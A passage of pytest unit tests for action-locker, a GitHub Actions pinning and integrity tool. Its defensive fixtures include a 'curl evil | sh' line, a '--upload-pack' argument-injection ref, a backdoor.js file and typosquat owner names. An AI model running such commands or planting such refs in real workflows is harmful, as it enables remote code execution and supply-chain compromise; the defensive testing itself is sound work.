"""Unit tests for action-locker, run against OWL-shaped workflow fixtures.

All tests here are offline. Network-dependent behavior (lock/vendor/update)
is covered by tests/test_integration.py, which is opt-in.
"""

import argparse
import json

import pytest

import action_locker
from action_locker import (
    cmd_rewrite,
    cmd_update,
    cmd_vendor,
    cmd_verify,
    is_sha,
    is_trusted,
    load_lockfile,
    normalize_trusted_prefixes,
    owner_repo_of,
    parse_workflows,
    resolve_ref_to_sha,
    save_lockfile,
    tree_hash,
    vendor_dir_name,
)
from conftest import entry, write_lockfile

SHA_CREATE_TAG = "a1c7777fcb2fee4f19b0f283ba888afa11678b72"
SHA_GH_RELEASE = "3bb12739c298aeb8a4eeaf626c5b8d85266b0e65"


# --- parse_workflows ---

class TestParseWorkflows:
    def test_finds_all_remote_actions(self, owl_repo):
        actions = parse_workflows(owl_repo)
        assert set(actions) == {
            "Old-Well-Labs/infrastructure/.github/workflows/shared-pre-commit.yml@main",
            "Old-Well-Labs/infrastructure/.github/workflows/shared-build.yml@main",
            "actions/checkout@v4",
            "dorny/paths-filter@v3",
            "actions/setup-python@v5",
            "aws-actions/configure-aws-credentials@v4",
            f"rickstaa/action-create-tag@{SHA_CREATE_TAG}",
            f"softprops/action-gh-release@{SHA_GH_RELEASE}",
        }

    def test_skips_commented_out_uses(self, owl_repo):
        """Real OWL workflows carry '#  uses: softprops/action-gh-release@v2'."""
        actions = parse_workflows(owl_repo)
        assert "softprops/action-gh-release@v2" not in actions

    def test_skips_local_uses(self, owl_repo):
        """Local composite actions / reusable workflows have no @ref."""
        actions = parse_workflows(owl_repo)
        assert not any(a.startswith("./") for a in actions)

    def test_tracks_locations_per_use(self, owl_repo):
        actions = parse_workflows(owl_repo)
        # actions/checkout@v4 appears 3 times across both files
        locs = actions["actions/checkout@v4"]
        assert len(locs) == 3
        files = {f for f, _ in locs}
        assert files == {
            ".github/workflows/on_push.yml",
            ".github/workflows/release.yml",
        }

    def test_subpath_reusable_workflow_parsed(self, owl_repo):
        actions = parse_workflows(owl_repo)
        key = "Old-Well-Labs/infrastructure/.github/workflows/shared-build.yml@main"
        assert key in actions

    def test_empty_repo(self, tmp_path):
        assert parse_workflows(tmp_path) == {}

    def test_skips_docker_refs(self, tmp_path, capsys):
        """docker:// images are a different supply chain — not managed here."""
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            "jobs:\n  a:\n    steps:\n"
            "      - uses: docker://alpine:3.19\n"
            "      - uses: docker://ghcr.io/foo/bar@sha256:" + "b" * 64 + "\n"
            f"      - uses: x/y@{'7' * 40}\n"
        )
        actions = parse_workflows(tmp_path)
        assert set(actions) == {f"x/y@{'7' * 40}"}
        assert "docker://" in capsys.readouterr().err


# --- small helpers ---

class TestHelpers:
    def test_is_sha(self):
        assert is_sha(SHA_CREATE_TAG)
        assert not is_sha("v4")
        assert not is_sha("main")
        assert not is_sha(SHA_CREATE_TAG[:12])  # short SHA is not enough
        assert not is_sha(SHA_CREATE_TAG.upper())

    def test_owner_repo_of(self):
        assert owner_repo_of("actions/checkout") == "actions/checkout"
        assert (
            owner_repo_of("Old-Well-Labs/infrastructure/.github/workflows/x.yml")
            == "Old-Well-Labs/infrastructure"
        )

    def test_lockfile_roundtrip(self, tmp_path):
        data = {"version": 1, "locked": {"a/b@v1": entry("a/b", "0" * 40, "v1")},
                "trusted_prefixes": ["Old-Well-Labs/"]}
        save_lockfile(tmp_path, data)
        loaded = load_lockfile(tmp_path)
        assert loaded == data

    def test_load_missing_lockfile(self, tmp_path):
        assert load_lockfile(tmp_path) == {"version": 1, "locked": {}}


# --- verify ---

def run_verify(repo_root):
    args = argparse.Namespace()
    with pytest.raises(SystemExit) as exc:
        cmd_verify(args, repo_root)
    return exc.value.code


class TestVerify:
    def test_mutable_refs_fail(self, owl_repo, capsys):
        write_lockfile(owl_repo, {"x/y@v1": entry("x/y", "0" * 40, "v1")})
        assert run_verify(owl_repo) == 1
        out = capsys.readouterr().out
        assert "MUTABLE REF" in out
        assert "actions/checkout@v4" in out

    def test_trusted_prefix_downgrades_internal_main_refs(self, owl_repo, capsys):
        """Old-Well-Labs reusable workflows on @main are warnings, not errors."""
        write_lockfile(
            owl_repo,
            {
                f"rickstaa/action-create-tag@{SHA_CREATE_TAG}": entry(
                    "rickstaa/action-create-tag", SHA_CREATE_TAG
                ),
                f"softprops/action-gh-release@{SHA_GH_RELEASE}": entry(
                    "softprops/action-gh-release", SHA_GH_RELEASE
                ),
            },
            trusted_prefixes=["Old-Well-Labs/", "actions/", "dorny/", "aws-actions/"],
        )
        assert run_verify(owl_repo) == 0
        out = capsys.readouterr().out
        assert "TRUSTED MUTABLE" in out
        assert "shared-build.yml@main" in out

    def test_pinned_but_unlocked_fails(self, tmp_path, capsys):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: x/y@{'1' * 40}\n"
        )
        write_lockfile(tmp_path, {"q/r@v1": entry("q/r", "0" * 40, "v1")})
        assert run_verify(tmp_path) == 1
        assert "UNLOCKED" in capsys.readouterr().out

    def test_fully_pinned_and_locked_passes(self, tmp_path, capsys):
        sha = "2" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: actions/checkout@{sha}  # v4\n"
        )
        write_lockfile(
            tmp_path,
            {"actions/checkout@v4": entry("actions/checkout", sha, "v4")},
        )
        assert run_verify(tmp_path) == 0
        assert "verified" in capsys.readouterr().out

    def test_stale_lock_entry_warns(self, tmp_path, capsys):
        sha = "2" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: actions/checkout@{sha}\n"
        )
        write_lockfile(
            tmp_path,
            {
                "actions/checkout@v4": entry("actions/checkout", sha, "v4"),
                "old/gone@v1": entry("old/gone", "3" * 40, "v1"),
            },
        )
        assert run_verify(tmp_path) == 0
        assert "STALE: old/gone@v1" in capsys.readouterr().out

    def test_no_lockfile_exits_1(self, owl_repo):
        assert run_verify(owl_repo) == 1


# --- security: trusted_prefixes owner-boundary matching ---

class TestTrustedPrefixes:
    def test_prefix_without_slash_is_rejected(self):
        normalized, errors = normalize_trusted_prefixes(["actions"])
        assert normalized == []
        assert len(errors) == 1
        assert "INVALID" in errors[0]

    def test_prefix_normalized_to_trailing_slash(self):
        normalized, errors = normalize_trusted_prefixes(
            ["Old-Well-Labs/", "aws-actions/configure-aws-credentials"]
        )
        assert errors == []
        assert normalized == [
            "Old-Well-Labs/",
            "aws-actions/configure-aws-credentials/",
        ]

    def test_owner_boundary_not_crossed(self):
        """`actions/` must never trust `actions-evil/foo` (typosquat bypass)."""
        assert not is_trusted("actions-evil/foo", ["actions/"])
        assert is_trusted("actions/checkout", ["actions/"])

    def test_full_repo_prefix_matches_exact_repo_and_subpaths(self):
        normalized, _ = normalize_trusted_prefixes(
            ["aws-actions/configure-aws-credentials"]
        )
        assert is_trusted("aws-actions/configure-aws-credentials", normalized)
        assert is_trusted("aws-actions/configure-aws-credentials/sub/path", normalized)
        assert not is_trusted("aws-actions/configure-aws-credentials-evil", normalized)

    def test_verify_fails_on_no_slash_prefix_and_does_not_trust(self, tmp_path, capsys):
        """A bare `actions` prefix is a config error AND must not silently
        trust `actions-evil/foo@main` — verify exits 1 with both findings."""
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            "jobs:\n  a:\n    steps:\n      - uses: actions-evil/foo@main\n"
        )
        write_lockfile(
            tmp_path,
            {"x/y@v1": entry("x/y", "0" * 40, "v1")},
            trusted_prefixes=["actions"],
        )
        assert run_verify(tmp_path) == 1
        out = capsys.readouterr().out
        assert "INVALID trusted_prefixes entry `actions`" in out
        assert "MUTABLE REF" in out
        assert "actions-evil/foo@main" in out


# --- security: git ls-remote argument injection ---

class TestRefInjection:
    def test_parse_skips_leading_dash_ref(self, tmp_path, capsys):
        """`uses: evil/repo@--upload-pack=...` must not produce a parsed ref."""
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            "jobs:\n  a:\n    steps:\n      - uses: evil/repo@--upload-pack=/tmp/x\n"
        )
        actions = parse_workflows(tmp_path)
        assert actions == {}
        assert "must not start with '-'" in capsys.readouterr().err

    def test_resolve_rejects_leading_dash_ref_before_any_subprocess(self, monkeypatch):
        def boom(*a, **kw):  # pragma: no cover - should never run
            raise AssertionError("subprocess must not be invoked for '-' refs")

        monkeypatch.setattr(action_locker.subprocess, "run", boom)
        assert resolve_ref_to_sha("actions/checkout", "--upload-pack=/tmp/x") is None

    def test_ls_remote_calls_use_option_terminator(self, monkeypatch):
        """All ls-remote invocations must place `--` before url/ref positionals."""
        sha = "a" * 40
        calls = []

        def fake_run(cmd, **kw):
            calls.append(cmd)
            # Fail the first two lookups so all three ls-remote forms run.
            stdout = f"{sha}\trefs/tags/v4\n" if len(calls) == 3 else ""
            return type("R", (), {"returncode": 0, "stdout": stdout})()

        monkeypatch.setattr(action_locker.subprocess, "run", fake_run)
        assert resolve_ref_to_sha("actions/checkout", "v4") == sha
        assert len(calls) == 3
        for cmd in calls:
            assert cmd[:2] == ["git", "ls-remote"]
            assert "--" in cmd
            url_idx = cmd.index("https://github.com/actions/checkout.git")
            # `--` terminates option parsing before the url and ref
            assert cmd.index("--") == url_idx - 1
            assert all(not arg.startswith("-") for arg in cmd[url_idx:])


# --- security: vendor failure handling ---

class TestVendorFailures:
    def _vendor_repo(self, tmp_path):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text("jobs: {}\n")
        write_lockfile(tmp_path, {"x/y@v1": entry("x/y", "0" * 40, "v1")})
        return tmp_path

    def test_vendor_exits_1_when_download_fails(self, tmp_path, monkeypatch, capsys):
        repo = self._vendor_repo(tmp_path)
        monkeypatch.setenv("GITHUB_TOKEN", "test-token")
        calls = []

        def fake_run(cmd, **kw):
            calls.append(cmd)
            return type("R", (), {"returncode": 1, "stdout": "", "stderr": ""})()

        monkeypatch.setattr(action_locker.subprocess, "run", fake_run)
        with pytest.raises(SystemExit) as exc:
            cmd_vendor(argparse.Namespace(force=False), repo)
        assert exc.value.code == 1
        out = capsys.readouterr().out
        assert "FAILED (download)" in out
        assert "1 failed" in out

    def test_vendor_curl_uses_fail_flag(self, tmp_path, monkeypatch):
        repo = self._vendor_repo(tmp_path)
        monkeypatch.setenv("GITHUB_TOKEN", "test-token")
        curl_cmds = []

        def fake_run(cmd, **kw):
            if cmd[0] == "curl":
                curl_cmds.append(cmd)
            return type("R", (), {"returncode": 1, "stdout": "", "stderr": ""})()

        monkeypatch.setattr(action_locker.subprocess, "run", fake_run)
        with pytest.raises(SystemExit):
            cmd_vendor(argparse.Namespace(force=False), repo)
        assert curl_cmds and all("--fail" in cmd for cmd in curl_cmds)


# --- rewrite ---

class TestRewrite:
    def test_rewrites_mutable_refs_with_tag_comment(self, owl_repo):
        sha = "4" * 40
        write_lockfile(
            owl_repo,
            {"actions/checkout@v4": entry("actions/checkout", sha, "v4")},
        )
        cmd_rewrite(argparse.Namespace(), owl_repo)
        content = (owl_repo / ".github" / "workflows" / "on_push.yml").read_text()
        assert f"uses: actions/checkout@{sha}  # v4" in content
        assert "uses: actions/checkout@v4\n" not in content
        # Untouched refs stay put
        assert "uses: actions/setup-python@v5" in content
        assert "uses: ./.github/actions/run-regression" in content

    def test_rewrite_preserves_already_pinned(self, owl_repo):
        write_lockfile(
            owl_repo,
            {"actions/checkout@v4": entry("actions/checkout", "4" * 40, "v4")},
        )
        before = (owl_repo / ".github" / "workflows" / "release.yml").read_text()
        cmd_rewrite(argparse.Namespace(), owl_repo)
        after = (owl_repo / ".github" / "workflows" / "release.yml").read_text()
        assert f"rickstaa/action-create-tag@{SHA_CREATE_TAG}" in after
        # The commented line must survive rewrite untouched
        assert "#        uses: softprops/action-gh-release@v2" in after
        assert before.count("\n") == after.count("\n")

    def test_rewrite_noop_when_all_pinned(self, tmp_path, capsys):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: x/y@{'5' * 40}\n"
        )
        write_lockfile(tmp_path, {f"x/y@{'5' * 40}": entry("x/y", "5" * 40)})
        cmd_rewrite(argparse.Namespace(), tmp_path)
        assert "already pinned" in capsys.readouterr().out


# --- security: vendored tree integrity ---

class TestTreeHash:
    def _tree(self, root):
        root.mkdir(parents=True, exist_ok=True)
        (root / "action.yml").write_text("name: y\n")
        (root / "dist").mkdir(exist_ok=True)
        (root / "dist" / "index.js").write_text("console.log('hi')\n")
        return root

    def test_deterministic(self, tmp_path):
        a = self._tree(tmp_path / "a")
        b = self._tree(tmp_path / "b")
        assert tree_hash(a) == tree_hash(b)
        assert tree_hash(a).startswith("sha256:")

    def test_content_change_changes_hash(self, tmp_path):
        a = self._tree(tmp_path / "a")
        before = tree_hash(a)
        (a / "dist" / "index.js").write_text("console.log('pwned')\n")
        assert tree_hash(a) != before

    def test_added_file_changes_hash(self, tmp_path):
        a = self._tree(tmp_path / "a")
        before = tree_hash(a)
        (a / "extra.sh").write_text("curl evil | sh\n")
        assert tree_hash(a) != before

    def test_meta_file_excluded(self, tmp_path):
        a = self._tree(tmp_path / "a")
        before = tree_hash(a)
        (a / action_locker.META_FILE).write_text('{"anything": "at all"}\n')
        assert tree_hash(a) == before

    def test_rename_changes_hash(self, tmp_path):
        a = self._tree(tmp_path / "a")
        before = tree_hash(a)
        (a / "action.yml").rename(a / "action.yaml")
        assert tree_hash(a) != before


class TestVendoredIntegrity:
    SHA = "6" * 40

    def _repo(self, tmp_path, integrity="compute"):
        """Repo pinned to x/y@SHA with a vendored copy of it."""
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: x/y@{self.SHA}\n"
        )
        vend = tmp_path / ".github" / "vendored-actions" / vendor_dir_name("x/y", self.SHA)
        vend.mkdir(parents=True)
        (vend / "action.yml").write_text("name: y\n")
        (vend / "dist").mkdir()
        (vend / "dist" / "index.js").write_text("console.log('hi')\n")
        (vend / action_locker.META_FILE).write_text("{}\n")
        e = entry("x/y", self.SHA, "v1")
        if integrity == "compute":
            e["integrity"] = tree_hash(vend)
        elif integrity is not None:
            e["integrity"] = integrity
        write_lockfile(tmp_path, {"x/y@v1": e})
        return tmp_path, vend

    def test_intact_vendored_copy_passes(self, tmp_path, capsys):
        repo, _ = self._repo(tmp_path)
        assert run_verify(repo) == 0
        assert "verified" in capsys.readouterr().out

    def test_tampered_file_fails(self, tmp_path, capsys):
        repo, vend = self._repo(tmp_path)
        (vend / "dist" / "index.js").write_text("console.log('pwned')\n")
        assert run_verify(repo) == 1
        assert "INTEGRITY MISMATCH" in capsys.readouterr().out

    def test_added_file_fails(self, tmp_path, capsys):
        repo, vend = self._repo(tmp_path)
        (vend / "backdoor.js").write_text("// extra\n")
        assert run_verify(repo) == 1
        assert "INTEGRITY MISMATCH" in capsys.readouterr().out

    def test_missing_integrity_warns_but_passes(self, tmp_path, capsys):
        repo, _ = self._repo(tmp_path, integrity=None)
        assert run_verify(repo) == 0
        assert "NO INTEGRITY" in capsys.readouterr().out

    def test_unknown_vendor_dir_fails(self, tmp_path, capsys):
        repo, _ = self._repo(tmp_path)
        rogue = repo / ".github" / "vendored-actions" / "evil--impostor@abcdef1234"
        rogue.mkdir()
        (rogue / "action.yml").write_text("name: impostor\n")
        assert run_verify(repo) == 1
        assert "UNKNOWN VENDOR" in capsys.readouterr().out

    def test_meta_edit_does_not_fail(self, tmp_path, capsys):
        """The metadata file is bookkeeping, not payload — excluded from hash."""
        repo, vend = self._repo(tmp_path)
        (vend / action_locker.META_FILE).write_text('{"vendored_at": "whenever"}\n')
        assert run_verify(repo) == 0


class TestVendorRecordsIntegrity:
    def test_vendor_writes_integrity_to_lockfile_and_meta(self, tmp_path, monkeypatch):
        """End-to-end vendor with curl/tar faked via a real local archive."""
        import io
        import tarfile

        sha = "9" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(f"jobs:\n  a:\n    steps:\n      - uses: x/y@{sha}\n")
        write_lockfile(tmp_path, {"x/y@v1": entry("x/y", sha, "v1")})
        monkeypatch.setenv("GITHUB_TOKEN", "test-token")

        def fake_run(cmd, **kw):
            if cmd[0] == "curl":
                out = cmd[cmd.index("-o") + 1]
                buf = io.BytesIO()
                data = b"console.log('hi')\n"
                with tarfile.open(fileobj=buf, mode="w:gz") as tf:
                    info = tarfile.TarInfo(f"y-{sha}/dist/index.js")
                    info.size = len(data)
                    tf.addfile(info, io.BytesIO(data))
                # Pad so the size sanity check (>=100 bytes) passes
                payload = buf.getvalue() + b"\0" * 100
                with open(out, "wb") as f:
                    f.write(payload)
                return type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
            if cmd[0] == "tar":
                archive, dest = cmd[2], cmd[cmd.index("-C") + 1]
                with tarfile.open(archive) as tf:
                    tf.extractall(dest)
                return type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
            raise AssertionError(f"unexpected subprocess: {cmd}")

        monkeypatch.setattr(action_locker.subprocess, "run", fake_run)
        cmd_vendor(argparse.Namespace(force=False), tmp_path)

        lockdata = load_lockfile(tmp_path)
        integ = lockdata["locked"]["x/y@v1"]["integrity"]
        assert integ and integ.startswith("sha256:")
        vend = tmp_path / ".github" / "vendored-actions" / vendor_dir_name("x/y", sha)
        assert tree_hash(vend) == integ
        meta = json.loads((vend / action_locker.META_FILE).read_text())
        assert meta["integrity"] == integ
        # And verify agrees end-to-end
        assert run_verify(tmp_path) == 0


def patch_commit_age(monkeypatch, age_days, release_age_days=None, pr_age_days=None):
    """Make the age floor see the given ages, offline.

    age_days: committer-date age (None = undeterminable).
    release_age_days: immutable-release age (None = no immutable release).
    pr_age_days: earliest merged-PR age (None = no merged PR).
    The None defaults keep every test off the network."""
    from datetime import datetime, timedelta, timezone

    now = datetime.now(timezone.utc)

    def dated(days):
        return None if days is None else now - timedelta(days=days)

    monkeypatch.setattr(
        action_locker, "get_commit_date",
        lambda repo, sha, token=None: dated(age_days),
    )
    monkeypatch.setattr(
        action_locker, "get_release_published_at",
        lambda repo, tag, token=None: dated(release_age_days),
    )
    monkeypatch.setattr(
        action_locker, "get_earliest_merged_pr_date",
        lambda repo, sha, token=None: dated(pr_age_days),
    )


class TestLockForcePreservesIntegrity:
    def test_same_sha_relock_keeps_integrity(self, tmp_path, monkeypatch, capsys):
        """`lock --force` on an unchanged ref must not drop the vendored
        integrity hash; a changed SHA must."""
        from action_locker import cmd_lock

        sha = "3" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text("jobs:\n  a:\n    steps:\n      - uses: x/y@v1\n")
        e = entry("x/y", sha, "v1")
        e["integrity"] = "sha256:" + "d" * 64
        write_lockfile(tmp_path, {"x/y@v1": e})
        monkeypatch.setenv("GITHUB_TOKEN", "test-token")
        patch_commit_age(monkeypatch, 30)  # age floor applies to bare Namespaces too

        # Same SHA -> integrity survives
        monkeypatch.setattr(action_locker, "resolve_ref_to_sha", lambda *a, **kw: sha)
        cmd_lock(argparse.Namespace(force=True), tmp_path)
        assert load_lockfile(tmp_path)["locked"]["x/y@v1"]["integrity"] == "sha256:" + "d" * 64

        # New SHA -> integrity gone (content is different now)
        monkeypatch.setattr(action_locker, "resolve_ref_to_sha", lambda *a, **kw: "4" * 40)
        cmd_lock(argparse.Namespace(force=True), tmp_path)
        assert "integrity" not in load_lockfile(tmp_path)["locked"]["x/y@v1"]


class TestUpdateClearsIntegrity:
    def test_apply_clears_integrity_and_warns(self, tmp_path, monkeypatch, capsys):
        old_sha, new_sha = "1" * 40, "2" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(f"jobs:\n  a:\n    steps:\n      - uses: x/y@{old_sha}\n")
        e = entry("x/y", old_sha, "v1")
        e["integrity"] = "sha256:" + "e" * 64
        write_lockfile(tmp_path, {"x/y@v1": e})

        monkeypatch.setattr(action_locker, "resolve_ref_to_sha", lambda *a, **kw: new_sha)
        patch_commit_age(monkeypatch, 30)  # aged commit: floor passes, apply proceeds
        cmd_update(argparse.Namespace(apply=True), tmp_path)

        lockdata = load_lockfile(tmp_path)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == new_sha
        assert lockdata["locked"]["x/y@v1"]["integrity"] is None
        assert "integrity hashes were cleared" in capsys.readouterr().out

    def test_apply_skip_fresh_keeps_integrity(self, tmp_path, monkeypatch, capsys):
        """A SKIPPED (too-fresh) update must keep both the old pin AND its
        integrity hash — the vendored copy is still the locked content."""
        old_sha, new_sha = "1" * 40, "2" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(f"jobs:\n  a:\n    steps:\n      - uses: x/y@{old_sha}\n")
        e = entry("x/y", old_sha, "v1")
        e["integrity"] = "sha256:" + "e" * 64
        write_lockfile(tmp_path, {"x/y@v1": e})

        monkeypatch.setattr(action_locker, "resolve_ref_to_sha", lambda *a, **kw: new_sha)
        patch_commit_age(monkeypatch, 1)  # fresh: below the floor
        cmd_update(argparse.Namespace(apply=True), tmp_path)

        out = capsys.readouterr().out
        assert "SKIPPED x/y" in out and "No updates applied" in out
        lockdata = load_lockfile(tmp_path)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == old_sha
        assert lockdata["locked"]["x/y@v1"]["integrity"] == "sha256:" + "e" * 64


# --- commit age floor (lock) ---

def lock_args(**overrides):
    defaults = dict(force=False, allow_fresh=False, min_age_days=5.0)
    defaults.update(overrides)
    return argparse.Namespace(**defaults)


@pytest.fixture
def aged_repo(tmp_path):
    """Single third-party action on a mutable tag, plus one trusted ref."""
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    wf.joinpath("ci.yml").write_text(
        "jobs:\n"
        "  shared:\n"
        "    uses: Old-Well-Labs/infrastructure/.github/workflows/shared-build.yml@main\n"
        "  a:\n"
        "    steps:\n"
        "      - uses: x/y@v1\n"
    )
    return tmp_path


class TestCommitAgeFloor:
    SHA = "6" * 40

    def _patch(self, monkeypatch, age_days):
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: self.SHA
        )
        patch_commit_age(monkeypatch, age_days)

    def test_refuses_fresh_third_party_commit(self, aged_repo, monkeypatch, capsys):
        self._patch(monkeypatch, age_days=1)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), aged_repo)
        out = capsys.readouterr().out
        assert "REFUSED" in out
        assert "age floor" in out
        lockdata = load_lockfile(aged_repo)
        assert "x/y@v1" not in lockdata["locked"]

    def test_locks_aged_third_party_commit(self, aged_repo, monkeypatch):
        self._patch(monkeypatch, age_days=30)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        action_locker.cmd_lock(lock_args(), aged_repo)
        lockdata = load_lockfile(aged_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_trusted_prefix_exempt_from_age_check(self, aged_repo, monkeypatch):
        self._patch(monkeypatch, age_days=30)

        def boom(repo, sha, token=None):
            raise AssertionError(f"age check ran for trusted repo {repo}")

        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        # Only the trusted ref remains; age lookup must never fire for it
        wf = aged_repo / ".github" / "workflows" / "ci.yml"
        wf.write_text(
            "jobs:\n"
            "  shared:\n"
            "    uses: Old-Well-Labs/infrastructure/.github/workflows/shared-build.yml@main\n"
        )
        monkeypatch.setattr(action_locker, "get_commit_date", boom)
        action_locker.cmd_lock(lock_args(), aged_repo)

    def test_allow_fresh_overrides_floor(self, aged_repo, monkeypatch):
        self._patch(monkeypatch, age_days=0.1)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        action_locker.cmd_lock(lock_args(allow_fresh=True), aged_repo)
        lockdata = load_lockfile(aged_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_unknown_age_fails_closed(self, aged_repo, monkeypatch, capsys):
        self._patch(monkeypatch, age_days=None)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), aged_repo)
        assert "could not determine commit age" in capsys.readouterr().out
        lockdata = load_lockfile(aged_repo)
        assert "x/y@v1" not in lockdata["locked"]

    def test_min_age_days_tunable(self, aged_repo, monkeypatch):
        self._patch(monkeypatch, age_days=3)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        action_locker.cmd_lock(lock_args(min_age_days=2.0), aged_repo)
        lockdata = load_lockfile(aged_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_bare_namespace_defaults_age_floor(self, aged_repo, monkeypatch):
        """Programmatic callers passing only `force` must not AttributeError;
        the age floor still applies with default settings."""
        self._patch(monkeypatch, age_days=1)
        write_lockfile(aged_repo, {}, trusted_prefixes=["Old-Well-Labs/"])
        with pytest.raises(SystemExit):  # refused by default 5-day floor
            action_locker.cmd_lock(argparse.Namespace(force=False), aged_repo)
        lockdata = load_lockfile(aged_repo)
        assert "x/y@v1" not in lockdata["locked"]


# --- age trust ladder: immutable releases beat committer dates ---

class TestAgeTrustLadder:
    SHA = "6" * 40

    def _repo(self, tmp_path):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            "jobs:\n  a:\n    steps:\n      - uses: x/y@v1\n"
        )
        write_lockfile(tmp_path, {})
        return tmp_path

    def _patch_resolve(self, monkeypatch):
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: self.SHA
        )

    def test_backdated_commit_fresh_immutable_release_refused(
        self, tmp_path, monkeypatch, capsys
    ):
        """THE attack the ladder defeats: attacker backdates the malicious
        commit 100 days, but the immutable release binding the tag was
        published yesterday — the server-side date wins, floor refuses."""
        repo = self._repo(tmp_path)
        self._patch_resolve(monkeypatch)
        patch_commit_age(monkeypatch, age_days=100, release_age_days=0.5)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), repo)
        out = capsys.readouterr().out
        assert "REFUSED" in out
        assert "immutable release" in out

    def test_old_immutable_release_passes_regardless_of_commit_date(
        self, tmp_path, monkeypatch
    ):
        """An immutable release from 30 days ago froze the tag→commit binding
        30 days ago — that's the age that matters."""
        repo = self._repo(tmp_path)
        self._patch_resolve(monkeypatch)
        patch_commit_age(monkeypatch, age_days=1, release_age_days=30)
        action_locker.cmd_lock(lock_args(), repo)
        assert load_lockfile(repo)["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_no_immutable_release_falls_back_to_committer_date(
        self, tmp_path, monkeypatch, capsys
    ):
        repo = self._repo(tmp_path)
        self._patch_resolve(monkeypatch)
        patch_commit_age(monkeypatch, age_days=1, release_age_days=None)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), repo)
        out = capsys.readouterr().out
        assert "REFUSED" in out
        assert "committer date" in out

    def test_sha_ref_passes_no_tag_to_release_lookup(self, tmp_path, monkeypatch):
        """A bare SHA ref has no tag — the release lookup must receive
        tag=None (its falsy-tag early return keeps it off the network)."""
        sha = "8" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: x/y@{sha}\n"
        )
        write_lockfile(tmp_path, {})
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)

        seen_tags = []

        def spy(repo, tag, token=None):
            seen_tags.append(tag)
            return None

        monkeypatch.setattr(action_locker, "get_release_published_at", spy)
        from datetime import datetime, timedelta, timezone
        monkeypatch.setattr(
            action_locker, "get_commit_date",
            lambda repo, s, token=None: datetime.now(timezone.utc) - timedelta(days=30),
        )
        action_locker.cmd_lock(lock_args(), tmp_path)
        assert seen_tags == [None]
        assert load_lockfile(tmp_path)["locked"][f"x/y@{sha}"]["resolved"] == sha

    def test_update_apply_uses_release_date(self, tmp_path, monkeypatch, capsys):
        old_sha, new_sha = "1" * 40, "2" * 40
        write_lockfile(tmp_path, {"x/y@v1": entry("x/y", old_sha, "v1")})
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: new_sha
        )
        patch_commit_age(monkeypatch, age_days=100, release_age_days=1)
        action_locker.cmd_update(update_args(), tmp_path)
        out = capsys.readouterr().out
        assert "SKIPPED x/y" in out and "immutable release" in out
        assert load_lockfile(tmp_path)["locked"]["x/y@v1"]["resolved"] == old_sha


# --- lockfile policy: per-prefix floors + trusted-source requirement ---

class TestPolicy:
    SHA = "6" * 40

    def _repo(self, tmp_path, policy=None, uses="x/y@v1"):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: {uses}\n"
        )
